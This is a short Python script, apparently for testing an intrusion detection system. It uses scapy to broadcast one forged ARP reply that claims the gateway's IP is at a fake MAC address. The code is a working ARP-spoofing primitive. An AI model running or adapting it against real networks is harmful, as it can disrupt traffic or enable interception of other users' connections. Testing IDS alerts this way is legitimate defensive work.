# arp_spoofer_test.py
from scapy.all import sendp, ARP, Ether

# This is your router's IP from your ipconfig output
gateway_ip = "10.45.38.109" #change this by doing ipconfig

# An obviously fake MAC address
fake_mac = "00:11:22:33:44:55"

print(f"Sending a fake ARP reply...")
print(f"Claiming that the router ({gateway_ip}) is now at MAC address {fake_mac}")

# We craft a fake ARP "reply" (op=2)
# This packet tells everyone on the network the new, fake MAC for the router
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst="255.255.255.255", psrc=gateway_ip, hwsrc=fake_mac)

# Send the packet
sendp(packet, verbose=False)

print("Fake packet sent! Check your IDS for an alert.")